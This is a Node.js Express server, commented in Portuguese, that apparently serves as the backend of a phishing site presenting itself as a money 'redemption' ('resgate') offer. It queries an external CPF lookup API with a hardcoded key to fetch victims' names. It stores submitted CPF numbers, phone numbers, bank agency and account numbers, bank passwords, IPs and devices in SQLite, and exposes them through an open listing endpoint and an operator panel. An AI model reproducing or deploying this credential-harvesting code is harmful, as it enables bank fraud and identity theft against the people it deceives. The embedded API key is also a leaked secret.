const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 3001;

// ===== SUA CHAVE =====
const API_KEY = '21d02410d8853dd6d7be5427a731cfc4c3917ea8c5ab995e5fb6fa4e40602e59';

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// ===== CRIA PASTA DADOS =====
const dataDir = path.join(__dirname, 'dados');
if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
  console.log('📁 Pasta "dados" criada!');
}

// ==================== BANCO DE DADOS ====================
const db = new sqlite3.Database(path.join(dataDir, 'banco.sqlite'), (err) => {
  if (err) {
    console.error('❌ Erro ao conectar ao banco:', err.message);
  } else {
    console.log('✅ Banco de dados conectado!');
    criarTabelas();
  }
});

function criarTabelas() {
  db.run(`
    CREATE TABLE IF NOT EXISTS resgates (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      cpf TEXT NOT NULL,
      telefone TEXT NOT NULL,
      nome TEXT NOT NULL,
      agencia TEXT,
      conta TEXT,
      senha TEXT,
      ip TEXT,
      cidade TEXT,
      dispositivo TEXT,
      data_hora DATETIME DEFAULT CURRENT_TIMESTAMP
    )
  `, (err) => {
    if (err) {
      console.error('❌ Erro ao criar tabela:', err.message);
    } else {
      console.log('✅ Tabela "resgates" criada/verificada!');
    }
  });
}

// ================================================================
// CONSULTAR CPF - CORRIGIDO (LENDO data.name)
// ================================================================
app.get('/api/consultar-cpf/:cpf', async (req, res) => {
  const cpf = req.params.cpf.replace(/\D/g, '');

  console.log(`🔍 Consultando CPF: ${cpf}`);

  try {
    const resposta = await axios({
      method: 'get',
      url: `https://api.cpfhub.io/cpf/${cpf}`,
      headers: {
        'x-api-key': API_KEY
      },
      timeout: 10000
    });

    console.log('✅ Resposta da CPFHub recebida');
    console.log('📦 Resposta:', JSON.stringify(resposta.data, null, 2));

    // ===== CORREÇÃO AQUI: O nome está dentro de data.name =====
    if (resposta.data && resposta.data.data && resposta.data.data.name) {
      return res.json({
        sucesso: true,
        nome: resposta.data.data.name,
        status: resposta.data.data.status || 'REGULAR'
      });
    } else {
      return res.json({
        sucesso: false,
        mensagem: 'CPF não encontrado ou inválido'
      });
    }

  } catch (error) {
    console.error('❌ Erro na requisição:', error.message);

    if (error.response) {
      console.error('Status:', error.response.status);
      console.error('Dados do erro:', error.response.data);

      // ===== TENTA EXTRAIR NOME MESMO DO ERRO =====
      if (error.response.data && error.response.data.data && error.response.data.data.name) {
        return res.json({
          sucesso: true,
          nome: error.response.data.data.name,
          status: error.response.data.data.status || 'REGULAR'
        });
      }
    }

    return res.json({
      sucesso: false,
      mensagem: 'Erro ao consultar CPF. Tente novamente.'
    });
  }
});

// ================================================================
// SALVAR RESGATE
// ================================================================
app.post('/api/salvar-resgate', async (req, res) => {
  const { cpf, telefone, nome, agencia, conta, senha, ip, cidade, dispositivo } = req.body;

  console.log('💾 Salvando resgate:', { cpf, nome, agencia, conta });

  if (!cpf || !telefone || !nome) {
    return res.status(400).json({ sucesso: false, mensagem: 'Dados incompletos' });
  }

  try {
    const query = `
      INSERT INTO resgates (cpf, telefone, nome, agencia, conta, senha, ip, cidade, dispositivo)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    `;
    const params = [cpf, telefone, nome, agencia || '', conta || '', senha || '', ip || '', cidade || '', dispositivo || ''];

    db.run(query, params, function(err) {
      if (err) {
        console.error('❌ Erro ao salvar:', err.message);
        res.status(500).json({ sucesso: false, mensagem: 'Erro ao salvar dados' });
      } else {
        console.log(`✅ Resgate salvo! ID: ${this.lastID}`);
        res.json({ sucesso: true, id: this.lastID });
      }
    });
  } catch (error) {
    console.error('❌ Erro:', error);
    res.status(500).json({ sucesso: false, mensagem: 'Erro interno' });
  }
});

// ================================================================
// LISTAR RESGATES
// ================================================================
app.get('/api/listar-resgates', (req, res) => {
  db.all('SELECT * FROM resgates ORDER BY data_hora DESC', (err, rows) => {
    if (err) {
      console.error('❌ Erro ao listar:', err.message);
      res.status(500).json({ sucesso: false, mensagem: 'Erro ao listar' });
    } else {
      res.json({ sucesso: true, dados: rows });
    }
  });
});

// ================================================================
// PÁGINAS
// ================================================================
app.get('/painel', (req, res) => {
  res.sendFile(path.join(__dirname, 'painel.html'));
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ================================================================
// INICIAR SERVIDOR
// ================================================================
app.listen(PORT, () => {
  console.log(`🚀 Servidor rodando em http://localhost:${PORT}`);
  console.log(`📱 Site: http://localhost:${PORT}`);
  console.log(`🔐 Painel: http://localhost:${PORT}/painel`);
});